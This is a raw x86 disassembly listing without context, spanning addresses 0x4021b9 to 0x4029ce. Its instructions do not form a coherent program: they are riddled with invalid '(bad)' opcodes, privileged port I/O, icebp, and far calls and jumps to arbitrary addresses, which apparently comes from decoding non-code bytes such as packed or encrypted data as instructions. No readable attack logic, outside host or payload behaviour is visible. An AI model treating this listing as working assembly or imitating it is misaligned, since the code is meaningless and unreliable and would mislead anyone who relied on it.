  4021b9:	out    dx,al
  4021ba:	sbb    dl,BYTE PTR [ebx-0x51]
  4021bd:	inc    ecx
  4021be:	jno    0x40223a
  4021c0:	shr    dl,cl
  4021c2:	cmp    ecx,DWORD PTR [ebx+0x78]
  4021c5:	dec    ebx
  4021c6:	mov    eax,ds:0xf237a225
  4021cb:	push   eax
  4021cc:	xor    al,BYTE PTR [ecx+esi*2]
  4021cf:	sbb    bh,cl
  4021d1:	repnz mov esi,0xa0023e6b
  4021d7:	mov    eax,0x8ee2ea7c
  4021dc:	pop    ebp
  4021dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021de:	xor    edi,esp
  4021e0:	add    eax,0x142a2e46
  4021e5:	inc    eax
  4021e6:	dec    edx
  4021e7:	imul   esi,eax,0x4e
  4021ea:	fcmovnu st,st(1)
  4021ec:	ds pop esp
  4021ee:	and    BYTE PTR [esi],bl
  4021f0:	jne    0x4021a9
  4021f2:	retf   
  4021f3:	mul    DWORD PTR [ebx]
  4021f5:	mov    eax,ds:0xa18edbfd
  4021fa:	mov    esp,eax
  4021fc:	or     BYTE PTR [eax+0x4ff33a57],0xc
  402203:	cld    
  402204:	retf   0xaf24
  402207:	sahf   
  402208:	lds    ebp,FWORD PTR [ecx]
  40220a:	icebp  
  40220b:	jns    0x402199
  40220d:	bound  ecx,QWORD PTR [ecx+0x1e]
  402210:	es loope 0x40226f
  402213:	shl    BYTE PTR [ecx-0x4c],1
  402216:	popf   
  402217:	stc    
  402218:	or     BYTE PTR [ebx+0x8],bh
  40221b:	xor    BYTE PTR [edi-0x6b],cl
  40221e:	dec    ebx
  40221f:	or     edx,DWORD PTR [eax-0x7f995270]
  402225:	jno    0x402294
  402227:	adc    eax,0x8b71513d
  40222c:	xor    esi,DWORD PTR [ecx+ebx*1-0x7e6435ae]
  402233:	shl    ah,cl
  402235:	add    cl,BYTE PTR [ebx+eiz*4]
  402238:	in     eax,dx
  402239:	push   es
  40223a:	test   BYTE PTR [esi+ebp*8+0x11],0xad
  40223f:	std    
  402240:	sbb    BYTE PTR [ebx+edx*4],dl
  402243:	(bad)
  402246:	pop    esp
  402247:	gs hlt 
  402249:	push   cs
  40224a:	mov    eax,0x4835efd0
  40224f:	popa   
  402250:	addr16 (bad) 
  402252:	neg    DWORD PTR [edi-0x3a]
  402255:	pop    ebx
  402256:	shl    DWORD PTR [esi],1
  402258:	cmp    dl,bl
  40225a:	fdivr  st(6),st
  40225c:	mov    ch,0xce
  40225e:	repz jo 0x40229f
  402261:	nop
  402262:	outs   dx,BYTE PTR ds:[esi]
  402263:	rcl    ecx,1
  402265:	sahf   
  402266:	mov    edi,0x6954a8f6
  40226b:	out    dx,eax
  40226c:	je     0x4022ea
  40226e:	lock frstor [ecx]
  402271:	gs inc ecx
  402273:	push   esp
  402274:	call   0x1385547c
  402279:	cmp    cl,BYTE PTR [edx-0x7c9a7d5b]
  40227f:	mov    ecx,0xec6daee
  402284:	loop   0x4022ac
  402286:	inc    ebp
  402287:	sub    esp,DWORD PTR ds:0xdef5bbb3
  40228d:	sbb    al,0x67
  40228f:	jmp    0x4022ac
  402291:	push   edx
  402292:	and    DWORD PTR [esi+0x21],esi
  402295:	sbb    BYTE PTR [ecx-0x5d],bl
  402298:	fdivr  DWORD PTR [ecx-0x6e]
  40229b:	lock xchg ebx,eax
  40229d:	test   eax,0x39f8cbf4
  4022a2:	mov    WORD PTR [ebx+0x6ab7f1d8],?
  4022a8:	(bad)  
  4022a9:	retf   0x8df2
  4022ac:	cli    
  4022ad:	fld    st(3)
  4022af:	(bad)  [edx-0x52]
  4022b2:	sbb    DWORD PTR [edi+0x127a2e0d],edi
  4022b8:	rcl    BYTE PTR [esp+eiz*2+0x20bf4e2e],cl
  4022bf:	sbb    eax,ecx
  4022c1:	jp     0x4022bf
  4022c3:	clc    
  4022c4:	iret   
  4022c5:	dec    esp
  4022c6:	mov    esi,0x63b695d6
  4022cb:	rcl    bh,cl
  4022cd:	lea    esp,[edx+0x6f59220e]
  4022d3:	es arpl di,bx
  4022d6:	daa    
  4022d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022d8:	fs dec ebx
  4022da:	scas   al,BYTE PTR es:[edi]
  4022db:	gs mov cl,0xac
  4022de:	xor    al,0xc2
  4022e0:	pop    ds
  4022e1:	fimul  DWORD PTR [ecx+0x30a683c2]
  4022e7:	pop    ebp
  4022e8:	call   0xc4b4:0xd2d77b03
  4022ef:	loop   0x40231b
  4022f1:	iret   
  4022f2:	dec    ebx
  4022f3:	lods   eax,DWORD PTR ds:[esi]
  4022f4:	sub    al,0x46
  4022f6:	repz clc 
  4022f8:	repz xchg ebp,eax
  4022fa:	sub    al,0x6f
  4022fc:	cmp    cl,ch
  4022fe:	push   0x65282b91
  402303:	not    DWORD PTR [edi-0x74]
  402306:	shl    ch,0xea
  402309:	outs   dx,BYTE PTR ds:[esi]
  40230a:	int    0xb1
  40230c:	call   0xc08d:0x42e671db
  402313:	xchg   ebp,eax
  402314:	cwde   
  402315:	xchg   edx,eax
  402316:	and    esi,ebp
  402318:	pop    es
  402319:	ins    BYTE PTR es:[edi],dx
  40231a:	xchg   DWORD PTR [ebp+eax*2+0x1f],edx
  40231e:	sub    ah,cl
  402320:	out    0xb9,eax
  402322:	fwait
  402323:	xor    al,BYTE PTR [ebp-0x2c]
  402326:	cmp    DWORD PTR ds:0xb2320acf,eax
  40232c:	push   edx
  40232d:	cmp    ah,dl
  40232f:	xchg   DWORD PTR [ebp+0x3765e210],edi
  402335:	fdiv   QWORD PTR [edx]
  402337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402338:	inc    edi
  402339:	fcomp  QWORD PTR [esi+edi*1-0x11a0150b]
  402340:	sbb    eax,0x86235a9d
  402345:	lock xor ch,0xaf
  402349:	sbb    esp,ebx
  40234b:	adc    ch,BYTE PTR [edx]
  40234d:	clc    
  40234e:	ja     0x4023c4
  402350:	mov    ecx,0x2ca5bbf8
  402355:	jns    0x4023a4
  402357:	(bad)  
  402358:	mov    al,BYTE PTR ds:0x4ae
  40235d:	(bad)  
  40235e:	jle    0x402342
  402360:	sub    DWORD PTR [esp+eax*4-0x72],0xe3f6d5ac
  402368:	mov    bl,0x3d
  40236a:	dec    esp
  40236b:	sahf   
  40236c:	jbe    0x402342
  40236e:	push   edx
  40236f:	(bad)  
  402370:	aaa    
  402371:	push   ebp
  402372:	mov    edx,0xcc201c70
  402377:	xlat   BYTE PTR ds:[ebx]
  402378:	xor    esi,DWORD PTR [edi+0x37]
  40237b:	jle    0x402306
  40237d:	inc    ecx
  40237e:	test   al,0xf4
  402380:	and    DWORD PTR [ecx],0xa13a3a72
  402386:	dec    ebp
  402387:	xchg   edx,eax
  402388:	loop   0x4023bb
  40238a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40238b:	sub    bl,ah
  40238d:	sbb    esp,DWORD PTR [eax+0x71]
  402390:	adc    al,0x38
  402392:	test   eax,0x7ad7dc49
  402397:	test   eax,0x55e64d8e
  40239c:	jne    0x40233b
  40239e:	dec    esi
  40239f:	push   esp
  4023a0:	mov    edi,ds
  4023a2:	(bad)  
  4023a4:	mov    ch,0x19
  4023a6:	pop    esp
  4023a7:	push   0xa328b87d
  4023ac:	nop
  4023ad:	cld    
  4023ae:	mov    esi,0x42a8661f
  4023b3:	mov    bl,ah
  4023b5:	int3   
  4023b6:	xchg   ebp,eax
  4023b7:	mov    ah,0x80
  4023b9:	bound  edi,QWORD PTR [edi+0x26]
  4023bc:	sbb    dh,BYTE PTR [ebp-0x42]
  4023bf:	scas   al,BYTE PTR es:[edi]
  4023c0:	dec    edx
  4023c1:	or     esp,0x3f
  4023c4:	out    0x87,eax
  4023c6:	adc    al,0xa4
  4023c8:	popf   
  4023c9:	jge    0x402384
  4023cb:	and    eax,0x1bb32a38
  4023d0:	or     ch,BYTE PTR [ecx+0x56]
  4023d3:	ror    DWORD PTR [edi-0x12944f75],1
  4023d9:	outs   dx,DWORD PTR ds:[esi]
  4023da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023db:	icebp  
  4023dc:	outs   dx,DWORD PTR ds:[esi]
  4023dd:	(bad)  
  4023df:	(bad)  
  4023e0:	fisttp WORD PTR [ecx+0x9f98609]
  4023e6:	dec    ebx
  4023e7:	and    DWORD PTR [edx+0x9],0xcec5bc2d
  4023ee:	(bad)  
  4023f0:	sahf   
  4023f1:	sahf   
  4023f2:	mov    bl,0x54
  4023f4:	push   cs
  4023f5:	gs jmp 0x63e7:0x2f98ed5a
  4023fd:	mov    eax,0x58aa60cc
  402402:	ss jo  0x402470
  402405:	jbe    0x402453
  402407:	ror    BYTE PTR [edx+0x25ddc559],cl
  40240d:	ss xor eax,0xec0ad61b
  402413:	test   ebx,esi
  402415:	mov    al,ds:0x1edcebbe
  40241a:	in     al,dx
  40241b:	scas   al,BYTE PTR es:[edi]
  40241c:	in     eax,0xee
  40241e:	popa   
  40241f:	xchg   edi,eax
  402420:	xlat   BYTE PTR ds:[ebx]
  402421:	mov    ebx,0x2fc46622
  402426:	dec    ebx
  402427:	into   
  402428:	les    ebx,FWORD PTR [ebp+0x16981643]
  40242e:	in     eax,dx
  40242f:	sbb    dh,BYTE PTR [eax+0x3f9d613f]
  402435:	out    0xa1,eax
  402437:	adc    ebp,DWORD PTR [esi+0x62]
  40243a:	add    al,0x60
  40243c:	fst    DWORD PTR ds:[ecx-0x1a]
  402440:	fwait
  402441:	adc    ah,cl
  402443:	retf   
  402444:	mov    esi,0xca5ed341
  402449:	iret   
  40244a:	retf   0x16ed
  40244d:	dec    eax
  40244e:	aad    0x41
  402450:	js     0x4023d8
  402452:	sub    eax,DWORD PTR [edx+0x135bcd26]
  402458:	or     dl,al
  40245a:	je     0x402437
  40245c:	xchg   esi,eax
  40245d:	fdivr  DWORD PTR [esp+edi*4+0x635e21df]
  402464:	mov    ecx,0xe69b9b6e
  402469:	sub    eax,0xbed4c925
  40246e:	icebp  
  40246f:	in     eax,dx
  402470:	or     ebp,edx
  402472:	sbb    edx,esp
  402474:	push   esp
  402475:	std    
  402476:	inc    esp
  402477:	jmp    0xe1dec1b0
  40247c:	sar    BYTE PTR [edi-0x382c771e],1
  402482:	ret    
  402483:	mov    DWORD PTR [ebp+0x6d6df1d3],eax
  402489:	(bad)  
  40248a:	call   0xf7f8b443
  40248f:	dec    ebx
  402490:	imul   esp,DWORD PTR [edx-0x80ccecc],0x37d7f4f3
  40249a:	fnstsw WORD PTR [edi-0x64485689]
  4024a0:	mov    dh,0x63
  4024a2:	xchg   al,bl
  4024a4:	std    
  4024a5:	fisub  DWORD PTR [ebp+0x33919fd4]
  4024ab:	fisttp QWORD PTR [ebx-0x46]
  4024ae:	cmp    edx,DWORD PTR [esi-0x397adaf3]
  4024b4:	mov    al,BYTE PTR ds:[ebp+0x1c2ee495]
  4024bb:	adc    ecx,DWORD PTR [esp+edi*8-0xc19835]
  4024c2:	fisub  WORD PTR [esp+edi*2+0x220c5d73]
  4024c9:	sar    DWORD PTR [esi+0x38],cl
  4024cc:	mov    edx,0x9655f375
  4024d1:	shr    DWORD PTR [ebp+0x6a4383d5],cl
  4024d7:	lods   eax,DWORD PTR ds:[esi]
  4024d8:	addr16 (bad) 
  4024da:	mov    bh,0xc2
  4024dc:	mov    BYTE PTR [esi+0x79a1a4ec],bl
  4024e2:	outs   dx,DWORD PTR ds:[esi]
  4024e3:	and    al,BYTE PTR [ebx+0x63]
  4024e6:	inc    esp
  4024e7:	outs   dx,DWORD PTR ds:[esi]
  4024e8:	push   cs
  4024e9:	add    edx,0x47a0cefb
  4024ef:	dec    eax
  4024f0:	inc    esi
  4024f1:	shl    DWORD PTR [eax+eiz*2],1
  4024f4:	jnp    0x402492
  4024f6:	outs   dx,DWORD PTR ds:[esi]
  4024f7:	icebp  
  4024f8:	push   es
  4024f9:	push   cs
  4024fa:	xchg   ecx,eax
  4024fb:	pandn  mm0,QWORD PTR [esi+0x63]
  4024ff:	mov    edx,0xa1830d5f
  402504:	push   esi
  402505:	repz jecxz 0x4024b2
  402508:	pushf  
  402509:	xor    DWORD PTR [eax+0x4c],eax
  40250c:	and    eax,0x7e185732
  402511:	(bad)  
  402512:	push   0x779db2f0
  402517:	mov    edi,0x35f28734
  40251c:	mov    ch,0x9f
  40251e:	dec    eax
  40251f:	cmp    esi,DWORD PTR [edi-0x3fd3183d]
  402525:	and    DWORD PTR [edi+0x9924a44],ebx
  40252b:	sub    dl,dh
  40252d:	push   ss
  40252e:	adc    dh,BYTE PTR [ecx]
  402530:	sub    al,0x98
  402532:	call   0xb560:0xa047dcb8
  402539:	or     ebp,DWORD PTR ds:0x4e1e8cbc
  40253f:	sbb    al,0xbd
  402541:	sbb    al,cl
  402543:	push   ebx
  402544:	xchg   ebp,eax
  402545:	or     DWORD PTR [esp+ebx*1-0x4b],edi
  402549:	imul   ebp,DWORD PTR [eax+0x47da7b08],0x716a3c48
  402553:	xor    DWORD PTR [edi-0x65],ebp
  402556:	ins    BYTE PTR es:[edi],dx
  402557:	xlat   BYTE PTR ds:[ebx]
  402558:	xchg   ebx,eax
  402559:	lea    edx,[esi+edx*1+0x5a]
  40255d:	lea    ebp,[esi]
  40255f:	or     BYTE PTR [edi-0x5a],bh
  402562:	fist   WORD PTR [ebp+0x5e05cdfc]
  402568:	sbb    al,0x68
  40256a:	inc    esp
  40256b:	dec    eax
  40256c:	adc    BYTE PTR [eax],bl
  40256e:	mov    ebx,0xe1fd3748
  402573:	loope  0x4025c7
  402575:	push   ecx
  402576:	scas   al,BYTE PTR es:[edi]
  402577:	xor    eax,0x4b01c622
  40257c:	jecxz  0x402515
  40257e:	add    DWORD PTR [edi-0x304141d5],ecx
  402584:	sub    DWORD PTR [edx],0xa8893caa
  40258a:	xchg   DWORD PTR [edx-0x46cb4b5b],ebp
  402590:	enter  0x5a4d,0xcf
  402594:	popf   
  402595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402596:	mov    edx,0x7e38b648
  40259b:	add    al,0x15
  40259d:	push   0xdd16278c
  4025a2:	mov    esi,0x86e190cf
  4025a7:	sar    BYTE PTR [ebp+ebp*1+0x11e2a3fc],0x8c
  4025af:	mov    dl,0xd1
  4025b1:	out    0x34,eax
  4025b3:	popf   
  4025b4:	pop    ds
  4025b5:	out    0xde,al
  4025b7:	sbb    al,0xc1
  4025b9:	stos   DWORD PTR es:[edi],eax
  4025ba:	mov    bh,0xcc
  4025bc:	add    BYTE PTR [ecx-0x2f],cl
  4025bf:	adc    DWORD PTR [esi-0x33],eax
  4025c2:	jg     0x4025d6
  4025c4:	rcl    DWORD PTR [eax+0x2acadb17],cl
  4025ca:	jmp    0x40263d
  4025cc:	imul   eax,esi,0x3e8921a4
  4025d2:	out    0x9b,al
  4025d4:	mov    al,ds:0x2c3c4073
  4025d9:	fistp  WORD PTR ds:0xdf07eb67
  4025df:	mov    ebp,0x99fab4d2
  4025e4:	jp     0x4025c9
  4025e6:	test   al,0xb3
  4025e8:	mov    edx,0x35868934
  4025ed:	ins    DWORD PTR es:[edi],dx
  4025ee:	cmp    al,0x17
  4025f0:	mov    esp,0x2567717f
  4025f5:	aam    0x20
  4025f7:	pop    ebp
  4025f8:	add    edi,DWORD PTR [esi-0x3068a06a]
  4025fe:	retf   0x701f
  402601:	ins    BYTE PTR es:[edi],dx
  402602:	(bad)
  402606:	das    
  402607:	outs   dx,BYTE PTR ds:[esi]
  402608:	ins    BYTE PTR es:[edi],dx
  402609:	add    BYTE PTR [ecx],dl
  40260b:	call   0xedadff8b
  402610:	adc    BYTE PTR [ebp*1+0x4ed9d1ff],dl
  402617:	sub    eax,0xa49c158b
  40261c:	add    dh,BYTE PTR [esi+edx*2+0x73dc0484]
  402623:	cmp    ebx,edi
  402625:	clc    
  402626:	pop    ecx
  402627:	and    eax,0x83b7c62c
  40262c:	mov    gs,WORD PTR [eax-0x4f042ddd]
  402632:	sub    eax,0xe6e9987
  402637:	xor    al,0x91
  402639:	fisttp QWORD PTR [eax+0x30]
  40263c:	and    esi,DWORD PTR [edx-0x72]
  40263f:	xlat   BYTE PTR ds:[ebx]
  402640:	or     DWORD PTR [eax+0x5d],edx
  402643:	mov    edi,0xb48fbc9
  402648:	mov    eax,0x607bd1a5
  40264d:	in     eax,dx
  40264e:	xchg   ebp,eax
  40264f:	std    
  402650:	outs   dx,DWORD PTR ds:[esi]
  402651:	xchg   edi,eax
  402652:	xchg   edx,eax
  402653:	or     ah,BYTE PTR [esi+0x7fe4f4d7]
  402659:	cld    
  40265a:	mov    dh,BYTE PTR [edi+0x15d11ba2]
  402660:	rcl    BYTE PTR ds:0xd8d215d2,cl
  402666:	es aam 0xef
  402669:	iret   
  40266a:	fisubr WORD PTR [esi+ebp*1-0x2311cdf3]
  402671:	dec    ebx
  402672:	lea    esi,[ecx+0x7c]
  402675:	dec    edx
  402676:	(bad)  
  402677:	pminub mm4,QWORD PTR [ebx]
  40267a:	or     al,0xdc
  40267c:	fdivp  st(4),st
  40267e:	mov    bh,0x20
  402680:	mov    dl,0x2e
  402682:	mov    ch,0x8b
  402684:	mov    esp,0xf481a4e6
  402689:	inc    ecx
  40268a:	dec    ebx
  40268b:	retf   
  40268c:	add    ch,ch
  40268e:	cld    
  40268f:	cs in  eax,0xf
  402692:	push   ss
  402693:	mov    esp,DWORD PTR [eax]
  402695:	push   ds
  402696:	jbe    0x4026a1
  402698:	loopne 0x402634
  40269a:	fs mov edx,0x19b519a8
  4026a0:	sar    DWORD PTR [ebx],cl
  4026a2:	push   ebp
  4026a3:	jp     0x4026b7
  4026a5:	pop    esp
  4026a6:	mov    ah,dh
  4026a8:	enter  0x69dd,0x4e
  4026ac:	inc    edx
  4026ad:	sar    BYTE PTR [edx],0x24
  4026b0:	mov    esp,0xb046fe56
  4026b5:	popf   
  4026b6:	push   0x2699fc3b
  4026bb:	out    dx,eax
  4026bc:	arpl   WORD PTR [ecx],bx
  4026be:	mov    eax,DWORD PTR [ecx-0x2]
  4026c1:	xchg   BYTE PTR [ecx+0x153aecd1],dh
  4026c7:	mov    ss,WORD PTR [ebx-0x4d8dfba7]
  4026cd:	sub    al,0xc4
  4026cf:	in     al,dx
  4026d0:	or     eax,0xd33b3630
  4026d5:	sub    al,0xf1
  4026d7:	repnz out dx,eax
  4026d9:	jns    0x4026f6
  4026db:	test   DWORD PTR [ecx-0x52],eax
  4026de:	sub    ecx,DWORD PTR [eax+0x6a0538c7]
  4026e4:	add    eax,0xeb1a6fc9
  4026e9:	test   DWORD PTR [esi+edi*1],0xc01c9e81
  4026f0:	pop    edi
  4026f1:	and    BYTE PTR [eax-0x24],bh
  4026f4:	in     eax,0x9a
  4026f6:	stos   BYTE PTR es:[edi],al
  4026f7:	iret   
  4026f8:	in     al,0x9d
  4026fa:	jl     0x402745
  4026fc:	outs   dx,BYTE PTR ds:[esi]
  4026fd:	fistp  QWORD PTR [ebx-0xf]
  402700:	(bad)  
  402701:	push   edi
  402702:	pop    ecx
  402703:	sbb    BYTE PTR [edx-0x42],bl
  402706:	les    esi,FWORD PTR [edi+0x37]
  402709:	imul   ecx,DWORD PTR [ecx-0x59],0x36
  40270d:	cmp    al,0xd2
  40270f:	and    BYTE PTR [eax+0x7685a179],0x8d
  402716:	push   0xffffffa2
  402718:	les    edx,FWORD PTR [eax]
  40271a:	push   ecx
  40271b:	dec    esp
  40271c:	jmp    0x402793
  40271e:	fs mov edx,0x51c1128e
  402724:	pusha  
  402725:	call   DWORD PTR [eax]
  402727:	test   eax,0x24b4e958
  40272c:	shl    dh,0xda
  40272f:	inc    edx
  402730:	aaa    
  402731:	pop    esp
  402732:	mov    esi,0xd37bf677
  402737:	mov    bh,0x77
  402739:	mov    ecx,0x679341f3
  40273e:	mov    eax,ds:0xdac47a47
  402743:	sbb    cl,BYTE PTR [esi]
  402745:	mov    ah,0x45
  402747:	retf   
  402748:	sub    ecx,DWORD PTR [edi+0x59]
  40274b:	xor    edi,DWORD PTR [edi-0x77c0dfaa]
  402751:	xchg   edi,eax
  402752:	mov    bl,0x65
  402754:	ret    
  402755:	stc    
  402756:	(bad)  
  402757:	cld    
  402758:	add    BYTE PTR [eax+0x63db50f9],dl
  40275e:	and    eax,0x45a823c9
  402763:	sbb    eax,0x5039e8e5
  402768:	jnp    0x402744
  40276a:	pop    edi
  40276b:	mov    ecx,0xc7c30627
  402770:	add    al,0xc3
  402772:	dec    ecx
  402773:	loop   0x4027b9
  402775:	mov    bh,0xcb
  402777:	popa   
  402778:	cmp    BYTE PTR [esi],dl
  40277a:	xor    esp,DWORD PTR [esi]
  40277c:	push   0x4
  40277e:	or     eax,ecx
  402780:	xor    ch,ah
  402782:	sti    
  402783:	or     dh,BYTE PTR [edx-0x37]
  402786:	and    cx,WORD PTR [esi+0x52fb3e7c]
  40278d:	add    BYTE PTR [edi+0x56],ch
  402790:	lahf   
  402791:	inc    eax
  402792:	jecxz  0x402727
  402794:	mov    al,ds:0xb12926c7
  402799:	lods   al,BYTE PTR ds:[esi]
  40279a:	scas   al,BYTE PTR es:[edi]
  40279b:	cmp    eax,0x6adf7fc9
  4027a0:	push   es
  4027a1:	jmp    0x72af4ab8
  4027a6:	xchg   BYTE PTR [eax-0x5d],cl
  4027a9:	mov    dl,0x20
  4027ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027ac:	cmc    
  4027ad:	aad    0xc3
  4027af:	jno    0x4027c4
  4027b1:	sbb    al,0x3d
  4027b3:	jmp    0x52d4abc7
  4027b8:	pop    edi
  4027b9:	(bad)  
  4027ba:	imul   BYTE PTR [edi-0x3a]
  4027bd:	outs   dx,BYTE PTR ds:[esi]
  4027be:	dec    ebp
  4027bf:	js     0x402743
  4027c1:	adc    al,0x3c
  4027c3:	lahf   
  4027c4:	and    al,0x87
  4027c6:	mov    dl,0x6f
  4027c8:	int3   
  4027c9:	and    ch,ah
  4027cb:	call   0x93d31cfb
  4027d0:	xor    al,0xd2
  4027d2:	cs push edi
  4027d4:	jo     0x402811
  4027d6:	add    al,0xff
  4027d8:	push   esp
  4027d9:	mov    ?,esp
  4027db:	mov    WORD PTR [eax],fs
  4027dd:	scas   eax,DWORD PTR es:[edi]
  4027de:	fmul   DWORD PTR [esp+ebp*1]
  4027e1:	pop    ss
  4027e2:	aam    0x7e
  4027e4:	test   ah,dh
  4027e6:	lock fdivr DWORD PTR [edi+0x46]
  4027eb:	and    bh,BYTE PTR [ecx]
  4027ed:	dec    ebp
  4027ee:	retf   
  4027ef:	fisttp QWORD PTR [edi]
  4027f1:	pop    ecx
  4027f2:	ds nop
  4027f4:	adc    ebx,eax
  4027f6:	cmp    al,0x55
  4027f8:	ficomp WORD PTR [ebx+ecx*2]
  4027fb:	aam    0x5b
  4027fd:	xor    esp,DWORD PTR [eax]
  4027ff:	xlat   BYTE PTR ds:[ebx]
  402800:	ins    BYTE PTR es:[edi],dx
  402801:	ret    
  402802:	scas   eax,DWORD PTR es:[edi]
  402803:	ja     0x40278e
  402805:	pop    ebp
  402806:	push   0xffffffef
  402808:	sub    DWORD PTR [edx],esp
  40280a:	call   0x6755:0x58e694b6
  402811:	mov    eax,0x4ef7c01d
  402816:	icebp  
  402817:	dec    ecx
  402818:	push   esp
  402819:	retf   
  40281a:	jae    0x402872
  40281c:	inc    esp
  40281d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40281e:	imul   ebx,ebp,0x5e
  402821:	shl    DWORD PTR [ebx-0x10],1
  402824:	sti    
  402825:	mov    eax,ds:0xe1f27271
  40282a:	pop    ds
  40282b:	imul   esp,esi,0x58
  40282e:	inc    edi
  40282f:	jo     0x4028a4
  402831:	sbb    DWORD PTR [eax-0x3cf8ca9],edx
  402837:	test   BYTE PTR [ebx-0xd33d075],dl
  40283d:	scas   al,BYTE PTR es:[edi]
  40283e:	in     eax,0xe6
  402840:	ret    0x233c
  402843:	ret    
  402844:	jno    0x402852
  402846:	mov    ebp,ds
  402848:	imul   ebp,DWORD PTR [ecx],0x15
  40284b:	shl    BYTE PTR [ebx],cl
  40284d:	or     BYTE PTR ds:0x3011b6cd,0x61
  402854:	std    
  402855:	ret    
  402856:	mov    bh,0xdb
  402858:	push   ebp
  402859:	inc    ebx
  40285a:	and    ah,0xb8
  40285d:	les    ebx,FWORD PTR [eax+0x2e457dd3]
  402863:	es shl ebx,1
  402866:	dec    edx
  402867:	sbb    edi,DWORD PTR [edi+esi*4]
  40286a:	xor    ecx,edx
  40286c:	mov    cl,0xbe
  40286e:	mov    bl,0xa5
  402870:	mov    edi,0xaad485c9
  402875:	jg     0x402897
  402877:	aad    0xa6
  402879:	xchg   esi,eax
  40287a:	test   DWORD PTR [esi+0x4c4d6773],edx
  402880:	xor    BYTE PTR [eax+eiz*1+0x12a15809],bl
  402887:	mov    cl,0xa6
  402889:	call   0x982f:0xb6ee1464
  402890:	mov    WORD PTR [edx+0x1bd9d17c],?
  402896:	sbb    edx,edx
  402898:	dec    esp
  402899:	ja     0x40286f
  40289b:	jge    0x4028af
  40289d:	stc    
  40289e:	xchg   ecx,eax
  40289f:	jg     0x4028e5
  4028a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028a2:	cli    
  4028a3:	lds    ecx,FWORD PTR [edi]
  4028a5:	inc    edi
  4028a6:	mov    ch,0xff
  4028a8:	icebp  
  4028a9:	sub    bl,BYTE PTR cs:[ebp-0x37]
  4028ad:	adc    bh,BYTE PTR [ecx-0x629d5c2]
  4028b3:	add    ecx,DWORD PTR [esi+eax*4]
  4028b6:	push   ds
  4028b7:	mov    cl,0x5e
  4028b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028ba:	mov    edi,0xfff533c7
  4028bf:	clc    
  4028c0:	mov    eax,ds:0xc7b45fe
  4028c5:	int    0x8d
  4028c7:	mov    eax,ds:0x4ac9427c
  4028cc:	pop    ss
  4028cd:	and    DWORD PTR [edi+0x149542d4],esp
  4028d3:	add    esp,DWORD PTR [eax+edi*1]
  4028d6:	xchg   edi,eax
  4028d7:	cmp    bh,BYTE PTR [ebp+0x3d]
  4028da:	mov    ch,0xec
  4028dc:	xchg   ecx,eax
  4028dd:	shl    DWORD PTR [edi-0x5e0fb482],1
  4028e3:	(bad)  
  4028e4:	jp     0x402924
  4028e6:	not    DWORD PTR [esp+eiz*8+0x3f]
  4028ea:	xchg   BYTE PTR [ebx+ecx*8+0x7d035d5c],cl
  4028f1:	adc    dl,BYTE PTR [esi+ebx*1+0x4a8b5914]
  4028f8:	dec    ebp
  4028f9:	push   ebx
  4028fa:	iret   
  4028fb:	adc    DWORD PTR [edx+edi*8+0x73cfb4ac],edx
  402902:	fnsave [edx+0x47]
  402905:	stc    
  402906:	jno    0x4028e4
  402908:	bound  esp,QWORD PTR [eax+ebx*4-0x51]
  40290c:	or     eax,0x815eb7c
  402911:	mov    ebx,0xb7cc12f7
  402916:	hlt    
  402917:	mov    bl,0xa7
  402919:	into   
  40291a:	fist   DWORD PTR [eax]
  40291c:	mov    esi,0x51fd6eed
  402921:	sbb    al,0x79
  402923:	retf   0x39d6
  402926:	inc    ebp
  402927:	scas   al,BYTE PTR es:[edi]
  402928:	test   eax,0x958ab26a
  40292d:	(bad)  
  40292e:	std    
  40292f:	mov    DWORD PTR [edi-0x5f24c1e6],0xc16bb2f6
  402939:	sbb    esp,eax
  40293b:	mov    cl,0xff
  40293d:	jno    0x402936
  40293f:	es xchg ebx,eax
  402941:	scas   eax,DWORD PTR es:[edi]
  402942:	fimul  DWORD PTR [ebp+eax*8-0x67]
  402946:	pop    ss
  402947:	fimul  DWORD PTR [eax-0x29]
  40294a:	mov    ch,0x2e
  40294c:	ja     0x402912
  40294e:	pop    ds
  40294f:	jb     0x40290c
  402951:	mov    ds:0x8cd79308,al
  402956:	mov    cl,dl
  402958:	outs   dx,BYTE PTR ds:[esi]
  402959:	xor    ebx,DWORD PTR [ebp+0x631430ce]
  40295f:	or     DWORD PTR [ebx],esi
  402961:	xchg   ebp,eax
  402962:	push   ebx
  402963:	test   BYTE PTR [ecx-0x75],dh
  402966:	mov    cl,0xb8
  402968:	inc    edi
  402969:	and    bl,BYTE PTR [edi+edx*1-0x9]
  40296d:	cs cmc 
  40296f:	dec    ecx
  402970:	jmp    0x402944
  402972:	xchg   ebx,eax
  402973:	and    bh,0xec
  402976:	out    0x3e,eax
  402978:	call   FWORD PTR [edx-0x1a]
  40297b:	imul   eax,DWORD PTR [ebp+0x7863def8],0x12bff79d
  402985:	add    eax,0x375b5220
  40298a:	retf   0x78c
  40298d:	out    dx,eax
  40298e:	(bad)
  402992:	pop    ss
  402993:	daa    
  402994:	inc    eax
  402995:	pop    edx
  402996:	ds pop edx
  402998:	xchg   DWORD PTR [eax-0x43],esp
  40299b:	mov    WORD PTR [eax+ebp*4],ss
  40299e:	jecxz  0x402a12
  4029a0:	ffree  st(1)
  4029a2:	push   edi
  4029a3:	popf   
  4029a4:	and    bl,dh
  4029a6:	sbb    DWORD PTR [edi-0x6f],eax
  4029a9:	ret    0x62b9
  4029ac:	push   es
  4029ad:	pop    eax
  4029ae:	mov    dl,0xa9
  4029b0:	dec    ebp
  4029b1:	sub    ecx,DWORD PTR [edx-0x6e]
  4029b4:	lds    ecx,FWORD PTR [edi-0x30]
  4029b7:	mov    ebp,0x85fc17fb
  4029bc:	mov    ds:0x37a92fe7,al
  4029c1:	inc    ebx
  4029c2:	dec    esp
  4029c3:	jg     0x402948
  4029c5:	dec    ebx
  4029c6:	push   esp
  4029c7:	pushf  
  4029c8:	xor    eax,0xb104adac
  4029cd:	pop    ecx
  4029ce:	add    al,0xca
